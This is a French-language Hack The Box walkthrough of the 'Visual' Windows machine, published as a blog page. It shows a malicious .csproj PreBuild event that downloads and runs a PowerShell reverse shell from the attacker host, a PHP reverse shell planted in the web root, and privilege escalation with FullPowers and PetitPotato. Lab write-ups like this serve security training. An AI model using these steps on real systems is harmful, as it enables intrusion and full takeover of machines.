@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platforme: Hack The Box Link: Visual Niveau: Moyen OS: Windows La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.
+Adresse IP cible - 10.10.11.234
+Mon adresse IP - 10.10.14.222
+Balayage (Scanning) sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 Je commence avec un scan nmap et j&amp;rsquo;obtiens quelques informations:
+Un serveur web Apache Une machine Windows Une application PHP Starting Nmap 7." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/02/htb-visual/" />
+
+
+    <title>
+        
+            HTB: Visual
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB: Visual">
+<meta itemprop="description" content="Platforme: Hack The Box Link: Visual Niveau: Moyen OS: Windows La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.
+Adresse IP cible - 10.10.11.234
+Mon adresse IP - 10.10.14.222
+Balayage (Scanning) sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 Je commence avec un scan nmap et j&rsquo;obtiens quelques informations:
+Un serveur web Apache Une machine Windows Une application PHP Starting Nmap 7."><meta itemprop="datePublished" content="2024-02-24T19:37:32-06:00" />
+<meta itemprop="dateModified" content="2024-02-24T19:37:32-06:00" />
+<meta itemprop="wordCount" content="1690"><meta itemprop="image" content="https://scorpiosec.com/" />
+<meta itemprop="keywords" content="Hack The Box," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/" /><meta name="twitter:title" content="HTB: Visual"/>
+<meta name="twitter:description" content="Platforme: Hack The Box Link: Visual Niveau: Moyen OS: Windows La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.
+Adresse IP cible - 10.10.11.234
+Mon adresse IP - 10.10.14.222
+Balayage (Scanning) sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 Je commence avec un scan nmap et j&rsquo;obtiens quelques informations:
+Un serveur web Apache Une machine Windows Une application PHP Starting Nmap 7."/>
+
+
+
+    <meta property="og:title" content="HTB: Visual" />
+<meta property="og:description" content="Platforme: Hack The Box Link: Visual Niveau: Moyen OS: Windows La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.
+Adresse IP cible - 10.10.11.234
+Mon adresse IP - 10.10.14.222
+Balayage (Scanning) sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234 Je commence avec un scan nmap et j&rsquo;obtiens quelques informations:
+Un serveur web Apache Une machine Windows Une application PHP Starting Nmap 7." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/02/htb-visual/" /><meta property="og:image" content="https://scorpiosec.com/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-02-24T19:37:32-06:00" />
+<meta property="article:modified_time" content="2024-02-24T19:37:32-06:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-02-24 19:37:32 -0600 CST" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="en" href="https://scorpiosec.com/posts/2024/02/htb-visual/">en</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        8 minutes
+
+         | Aussi disponible en
+          
+              <a href="https://scorpiosec.com/posts/2024/02/htb-visual/"><span class="flag fi fi-gb"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/fr/posts/2024/02/htb-visual/">HTB: Visual</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table des matières</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#balayage-scanning">Balayage (Scanning)</a></li>
+    <li><a href="#enumération">Enumération</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#mouvement-latéral">Mouvement Latéral</a></li>
+    <li><a href="#escalade-des-privilèges">Escalade des privilèges</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platforme: Hack The Box</li>
+<li>Link: <a href="https://app.hackthebox.com/machines/Visual" target="_blank" >Visual</a>
+
+</li>
+<li>Niveau: Moyen</li>
+<li>OS: Windows</li>
+</ul>
+<hr>
+<p>La cible est une machine Windows de difficulté moyenne avec une application web acceptant les URLs des répertoires Git soumis par les utilisateurs.</p>
+<p>Adresse IP cible - <code>10.10.11.234</code></p>
+<!-- raw HTML omitted -->
+<p>Mon adresse IP - <code>10.10.14.222</code></p>
+<h2 id="balayage-scanning">Balayage (Scanning)</h2>
+<pre tabindex="0"><code>sudo nmap -sC -sV -oA nmap/Visual 10.10.11.234
+</code></pre><p>Je commence avec un scan nmap et j&rsquo;obtiens quelques informations:</p>
+<ul>
+<li>Un serveur web Apache</li>
+<li>Une machine Windows</li>
+<li>Une application PHP</li>
+</ul>
+<pre tabindex="0"><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:13 MST
+Nmap scan report for 10.10.11.234
+Host is up (0.047s latency).
+Not shown: 999 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
+|_http-title: Visual - Revolutionizing Visual Studio Builds
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 18.28 seconds
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>Nous accédons à l&rsquo;application web en visitant <code>http://10.10.11.234</code>. L&rsquo;application semble être un service permettant à l&rsquo;utilisateur de soumettre le lien d&rsquo;un répertoire Git, qui compilera ensuite le projet .NET pour l&rsquo;utilisateur.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/Visual-webapp.png" alt="Visual Webapp"></p>
+<p>Je teste la fonctionnalité en envoyant un URL, via Python3.</p>
+<pre tabindex="0"><code>python3 -m http.server
+</code></pre><p>Je soumets mon lien <code>http://10.10.14.222:8000</code> (Remplacez <code>10.10.14.222</code> par votre adresse IP)</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/link-submit-Visual-1.png" alt="Link-submit1"></p>
+<p>Je suis redirigé vers cette page, où l&rsquo;application tente de compiler mon projet.
+<img src="https://scorpiosec.com/images/HTB-Visual/Visual-build-attempt.png" alt="Build attempt"></p>
+<p>Comme il n&rsquo;y a pas de projet à cet URL, l&rsquo;opération échoue mais j&rsquo;obtiens quelques informations. Cette application recherche un fichier <code>.sln</code>.</p>
+<blockquote>
+<p>Un fichier .sln est un fichier de solution utilisé par Microsoft Visual Studio. Ce fichier sert de conteneur pour un ou plusieurs projets. Il permet d&rsquo;organiser et de gérer des projets au sein d&rsquo;un espace de travail unique. Le fichier .sln stocke des informations sur les projets qu&rsquo;il contient, notamment leurs dépendances, les configurations de construction et les références à des bibliothèques ou ressources externes.</p>
+</blockquote>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/Visual-build-failure.png" alt="Build failure"></p>
+<p>Je peux voir les réponses sur mon serveur.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/python3server-GET-method-1.png" alt="Get method server"></p>
+<p>Je vois un code 404, aucun fichier n&rsquo;ayant été trouvé à mon URL et <code>GET /info/refs?service=git-upload-pack HTTP/1.1&quot; 404</code>. Il semble que l&rsquo;application utilise le service <code>git-upload-pack</code> qui fait partie du protocole Git utilisé pour des opérations telles que le clonage ou la récupération de modifications à partir d&rsquo;un répertoire. Pour en savoir plus, cliquez <a href="https://git-scm.com/docs/git-upload-pack" target="_blank" >ici</a>
+
+.</p>
+<p>On peut lire sur le site que notre lien doit mener à un projet .NET 6.0 avec un fichier <code>.sln</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/Visual-dotnet-support.png" alt="Visual support"></p>
+<h2 id="foothold">Foothold</h2>
+<p>Je n&rsquo;ai jamais utilisé .NET, j&rsquo;ai donc demandé à ChatGPT de m&rsquo;aider à créer un projet pour cette technologie.</p>
+<pre tabindex="0"><code>dotnet new sln -n visual
+</code></pre><p>Lorsque vous exécutez la commande <code>dotnet new sln -n visual</code>, un nouveau fichier de solution nommé <code>visual.sln</code> est créé.
+<img src="https://scorpiosec.com/images/HTB-Visual/dotnet-new-sln.png" alt="Dotnet new sln"></p>
+<pre tabindex="0"><code>dotnet new console -n visual
+</code></pre><p>Cette commande crée un nouveau projet d&rsquo;application nommé <code>visual</code>. Ce projet contiendra les fichiers et les configurations nécessaires pour une application console de base écrite en C#.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/dotnet-new-console.png" alt="Dotnet new console"></p>
+<p>Ajoutons le fichier de projet <code>visual.csproj</code> situé dans le répertoire <code>visual</code> au fichier de la solution (<code>visual.sln</code>).</p>
+<pre tabindex="0"><code>dotnet sln add visual/visual.csproj
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Visual/dotnet-sln-add.png" alt="Dotnet sln add"></p>
+<blockquote>
+<p>Pour les projets .NET, un fichier <code>.csproj</code> est utilisé pour définir et configurer le projet. Il s&rsquo;agit d&rsquo;un fichier XML qui contient des métadonnées et des paramètres concernant le projet, tels que ses dépendances, ses paramètres de construction, le cadre cible, etc.</p>
+</blockquote>
+<p><code>git init</code> est utilisé pour initialiser un nouveau répertoire Git.</p>
+<pre tabindex="0"><code>git init
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Visual/visual-git-init.png" alt="Visual git init"></p>
+<p>Il nous faut trouver un moyen de servir notre répertoire Git à l&rsquo;application. J&rsquo;ai trouvé un excellent article à ce sujet ici, <a href="https://theartofmachinery.com/2016/07/02/git_over_http.html" target="_blank" >A Quick and Hacky Way to Serve a Git Repo over HTTP</a>
+
+.</p>
+<p>Exécutons maintenant les commandes suivantes</p>
+<pre tabindex="0"><code>git add .
+git commit -m &#34;Test&#34;
+cd .git
+git --bare update-server-info
+cd ..
+</code></pre><blockquote>
+<p>Nous devrons les exécuter à chaque fois que nous apporterons des modifications à nos fichiers. Lorsque vous exécutez <code>git --bare update-server-info</code>, Git met à jour les fichiers auxiliaires nécessaires pour servir le répertoire via le réseau.</p>
+</blockquote>
+<p>Relancez votre serveur python avec <code>python3 -m http.server</code> et soumettez votre URL maintenant que nous avons les bons fichiers.</p>
+<pre tabindex="0"><code>http://10.10.14.222:8000/.git
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Visual/url-submission-visual1.png" alt="Visual link submit2"></p>
+<!-- raw HTML omitted -->
+<p>Le processus de compilation est cette fois-ci un succès.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/visual-building-successful.png" alt="Visual successful build"></p>
+<p>De retour sur notre serveur, nous obtenons des requêtes GET valides.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/server-good-requests.png" alt="Server good requests"></p>
+<p>Je peux voir que l&rsquo;application compile les fichiers dans le répertoire git. Nous devons trouver un moyen d&rsquo;exploiter ce processus. En faisant des recherches, je trouve cette <a href="https://learn.microsoft.com/en-us/visualstudio/ide/how-to-specify-build-events-csharp?view=vs-2022" target="_blank" >page de Microsoft</a>
+
+ qui explique qu&rsquo;un &ldquo;pre-build event&rdquo; fait référence à un script ou à une commande qui est exécuté avant que le processus de compilation pour le projet ne commence.</p>
+<p>Nous pouvons utiliser un événement <code>PreBuild</code> dans le fichier <code>.csproj</code> pour exécuter des commandes. Essayons d&rsquo;ajouter un shell inversé (reverse shell).</p>
+<ul>
+<li>Ci-dessous, mon fichier <code>.csproj</code> modifié</li>
+</ul>
+<pre tabindex="0"><code>&lt;Project Sdk=&#34;Microsoft.NET.Sdk&#34;&gt;
+
+  &lt;PropertyGroup&gt;
+    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
+    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
+    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
+    &lt;Nullable&gt;enable&lt;/Nullable&gt;
+  &lt;/PropertyGroup&gt;
+
+&lt;Target Name=&#34;PreBuild&#34; BeforeTargets=&#34;PreBuildEvent&#34;&gt;
+    &lt;Exec Command=&#34;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.222:8000/revshell.ps1&#39;)&#34; /&gt;
+  &lt;/Target&gt;
+
+&lt;/Project&gt;
+</code></pre><ul>
+<li>Créons un script PowerShell <code>revshell.ps1</code> pour obtenir un shell distant. J&rsquo;ai utilisé ce <a href="https://github.com/K-Scorpio/scripts-collection/blob/main/revshell.ps1" target="_blank" >nishang shell</a>
+
+ pour le reverse shell. J&rsquo;ai modifié ce <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" >shell</a>
+
+, en changeant le nom de la fonction et en ajoutant le &ldquo;reverse switch&rdquo; à la fin.</li>
+</ul>
+<p>Je mets en place un listener netcat avec</p>
+<pre tabindex="0"><code>nc -nvlp 9001
+</code></pre><p>Nous utilisons encore ces commandes git</p>
+<pre tabindex="0"><code>git add .
+git commit -m &#34;Add as a test&#34;
+cd .git
+git --bare update-server-info
+cd ..
+</code></pre><p>Si vous avez stoppé votre serveur Python, redémarrez-le (et laissez-le tourner) et re-soumettez votre lien.</p>
+<p>Le listener devrait capturer un shell une fois la compilation terminée, nous sommes dans le système!</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/nc-listener-shell.png" alt="nc listener, reverse shell"></p>
+<p>Executer <code>whoami</code> nous permet de constater que nous sommes l&rsquo;utilisateur <code>enox</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/target-whoami.png" alt="whoami command on target"></p>
+<p>Nous pouvons vérifier nos privilèges avec <code>whoami /priv</code>.
+<img src="https://scorpiosec.com/images/HTB-Visual/target-priv.png" alt="privilege on target machine"></p>
+<p>Je vais dans le répertoire principal de l&rsquo;utilisateur avec <code>cd \Users\enox</code> et j&rsquo;utilise <code>ls</code> pour voir les différents sous-répertoires.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/target-directories.png" alt="directories listing on target"></p>
+<p>Je consulte le contenu du répertoire <code>Desktop</code> avec <code>dir Desktop</code> et je vois le drapeau <code>user.txt</code>. Utilisez <code>cat user.txt</code> pour examiner son contenu.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/Visual-user-flag.png" alt="User flag"></p>
+<h2 id="mouvement-latéral">Mouvement Latéral</h2>
+<p>Pour trouver les chemins d&rsquo;escalade de privilèges, utilisons <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20240223-ab2bb023" target="_blank" >winPEAS</a>
+
+. Téléchargez WinPEASany.exe et stockez-le dans le dossier que vous utilisez pour votre serveur python.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/winPEAS-location.png" alt="winPEAS location"></p>
+<p>Transférer le fichier sur le système cible avec <code>wget</code>.</p>
+<pre tabindex="0"><code>wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
+</code></pre><blockquote>
+<p>Utilisez votre adresse IP et remplacez le port par celui que vous utilisez pour votre serveur.</p>
+</blockquote>
+<p>Vérifiez que le fichier se trouve sur la cible.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/winPEAS-on-target.png" alt="winPEAS location on target"></p>
+<p>Vous pouvez vérifier les options de winPEAS avec <code>./wpany.exe -h</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/winpeas-options.png" alt="winPEAS options"></p>
+<p>Exécutez winPEAS avec les options que vous souhaitez. Parce que je veux une énumération assez complète, j&rsquo;utilise la commande suivante</p>
+<pre tabindex="0"><code>./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
+</code></pre><p>Il semble que nous possédons les permissions pour accéder au dossier contenant le service Apache HTTP Server.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/ApacheServerHTTP.png" alt="Apache Server HTTP"></p>
+<p>En parcourant les résultats, on peut noter que nous avons un accès complet au répertoire xampp (rappelez-vous qu&rsquo;il s&rsquo;agit d&rsquo;une application PHP), le même dossier que celui dans lequel Apache est stocké.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/xampp-permissions.png" alt="xampp directory"></p>
+<p>Nous pouvons essayer d&rsquo;en savoir plus sur <code>ApacheHTTPServer</code> avec</p>
+<pre tabindex="0"><code>Get-CIMInstance -Class Win32_Service -Filter &#34;Name=&#39;ApacheHTTPServer&#39;&#34; | Select-Object *
+</code></pre><p>Voici le résultat que nous obtenons, il semble qu&rsquo;il s&rsquo;exécute sous <code>NT AUTHORITY\NLocal Service</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/AppacheHTTPServer-info-1.png" alt="Apache HTTP Server service info"></p>
+<blockquote>
+<p>&ldquo;Sur Windows 10, le service UPnP Device Host est configuré pour s&rsquo;exécuter sans privilèges d&rsquo;usurpation d&rsquo;identité en tant qu&rsquo;utilisateur NT AUTHORITY\LOCAL SERVICE&hellip;&rdquo;. En résumé, nous pouvons réaliser une escalade des privilèges via ce compte. Pour en savoir plus, cliquez <a href="https://itm4n.github.io/localservice-privileges/" target="_blank" >ici</a>
+
+.</p>
+</blockquote>
+<p>Le service s&rsquo;exécute sous <code>NT AUTHORITY\NLocal Service</code>, nous devons donc accéder à ce compte. Puisque nous avons accès au répertoire xampp, nous pouvons y installer un reverse shell et y accéder via le navigateur web. Je vais dans ce répertoire et je liste son contenu.</p>
+<blockquote>
+<p>Pour les applications PHP, le dossier XAMPP sert de répertoire racine pour l&rsquo;hébergement des fichiers web (tels que HTML, PHP, CSS, JavaScript, images, etc.) et la gestion des paramètres de configuration du serveur.</p>
+</blockquote>
+<pre tabindex="0"><code>cd C:\Xampp\
+ls
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Visual/xampp-content-1.png" alt="xampp directory content"></p>
+<p>Remarquez le dossier <code>htdocs</code>.</p>
+<blockquote>
+<p>Avec XAMPP, le dossier <code>htdocs</code> est la racine du serveur web par défaut. Cela signifie que tous les fichiers placés dans le dossier <code>htdocs</code> seront accessibles via un navigateur web lorsque le serveur XAMPP est en cours d&rsquo;exécution.</p>
+</blockquote>
+<p>Les fichiers de l&rsquo;application sont présents, comme vous pouvez le voir. Nous pouvons placer un reverse shell PHP dans le dossier <code>htdocs</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/xampp-htdocs.png" alt="xampp htdocs directory"></p>
+<p>J&rsquo;ai utilisé ce <a href="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php" target="_blank" >reverse shell PHP</a>
+
+.</p>
+<p>Je lance ensuite <code>wget http://10.10.14.222:8000/revshell.php -o rev.php</code> pour le transférer sur le serveur cible.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/php-reverse-shell-1.png" alt="PHP reverse shell on the target"></p>
+<p>Mettons en place un listener netcat avec</p>
+<pre tabindex="0"><code>nc -nvlp 8010
+</code></pre><blockquote>
+<p>Utilisez le numéro de port que vous avez spécifié dans le reverse shell PHP.</p>
+</blockquote>
+<p>Retournez à votre navigateur et allez à <code>http://&lt;adresse IP cible&gt;/rev.php</code>, revenez à votre listener et vous devriez avoir un shell avec l&rsquo;utilisateur <code>nt authority\local service</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/nt-authority-local-service.png" alt="nt authority user shell on the target"></p>
+<p>Vérifiez vos privilèges et vous remarquez qu&rsquo;il vous manque le privilège <code>ImpersonatePrivilege</code> nécessaire pour obtenir les privilèges administratifs.</p>
+<p>Exécutons <code>whoami /priv</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/nt-authority-priv.png" alt="nt authority user privileges"></p>
+<h2 id="escalade-des-privilèges">Escalade des privilèges</h2>
+<p>Cet <a href="https://itm4n.github.io/localservice-privileges/" target="_blank" >article</a>
+
+ vous donne le lien d&rsquo;un outil qui permet d&rsquo;obtenir plus de privilèges. L&rsquo;outil s&rsquo;appelle <a href="https://github.com/itm4n/FullPowers" target="_blank" >FullPowers</a>
+
+. Téléchargez-le sur la machine cible (Assurez-vous d&rsquo;utiliser le reverse shell avec <code>nt authority\local service</code>).</p>
+<blockquote>
+<p>Ce fichier ne sera pas exécuté via le navigateur, donc nous retournons dans le répertoire <code>xampp</code> avec (<code>cd ..</code>) avant de télécharger notre fichier.</p>
+</blockquote>
+<pre tabindex="0"><code>wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
+</code></pre><p>Une erreur se produit parce que nous disposons actuellement d&rsquo;un shell cmd et non d&rsquo;un shell PowerShell.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/shell-error-1.png" alt="nt authority user shell error"></p>
+<p>Il suffit d&rsquo;utiliser <code>powershell</code> et de réexécuter la commande <code>wget</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/powershell-fullpowers-dl.png" alt="nt authority FullPowers dlownload"></p>
+<p>Maintenant, nous exécutons <code>fp.exe</code> et nous obtenons de nouveaux privilèges! Remarquez que nous avons été rétrogradés à un shell cmd et que nous avons été forcés hors du dossier <code>xampp</code>, nous devons donc exécuter <code>powershell</code> à nouveau et <code>cd C:\xampp</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/nt-authority-new-priv.png" alt="nt authority user new privileges"></p>
+<p>Nous pouvons maintenant utiliser <a href="https://github.com/wh0amitz/PetitPotato" target="_blank" >PetitPotato</a>
+
+ pour réaliser une escalade de privilèges en abusant de <code>ImpersonatePrivilege</code>.</p>
+<p>Nous le transmettons à la cible en exécutant</p>
+<pre tabindex="0"><code>wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
+</code></pre><p>Nous obtenons une erreur</p>
+<pre tabindex="0"><code>wget : Win32 internal error &#34;Access is denied&#34; 0x5 occurred while reading the console output buffer. Contact Microsoft 
+</code></pre><p>Il semble que cette erreur soit causée par la barre de progression affichée sur le terminal. Elle peut être résolue en exécutant <code>$ProgressPreference = &quot;SilentlyContinue&quot;</code> avant la commande <code>wget</code>.</p>
+<p>Nous pouvons maintenant utiliser notre fichier en exécutant</p>
+<pre tabindex="0"><code>./pp.exe 3 cmd
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Visual/PetitPotato-exploit.png" alt="PetitPotato exploit"></p>
+<p>Nous avons maintenant des privilèges d&rsquo;administrateur.</p>
+<pre tabindex="0"><code>cd C:\Users\Administrator\Desktop
+</code></pre><p>Ensuite, listons le contenu du répertoire, nous avons encore été rétrogradés à un shell cmd, nous devons donc utiliser <code>dir</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Visual/root-flag.png" alt="root flag"></p>
+<p>Nous trouvons le fichier <code>root.txt</code>! Utilisez <code>type root.txt</code> pour voir son contenu.</p>
+<p>C&rsquo;est tout pour mon premier writeup sur Hack The Box! J&rsquo;espère qu&rsquo;il vous a été utile. Si vous avez des questions, laissez un commentaire ou contactez-moi sur X <a href="https://twitter.com/_KScorpio" target="_blank" >@_KScorpio</a>
+
+.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/hack-the-box/">Hack The Box</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1690 Mots
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2024-02-24 19:37
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fscorpiosec.com%2ffr%2fposts%2f2024%2f02%2fhtb-visual%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
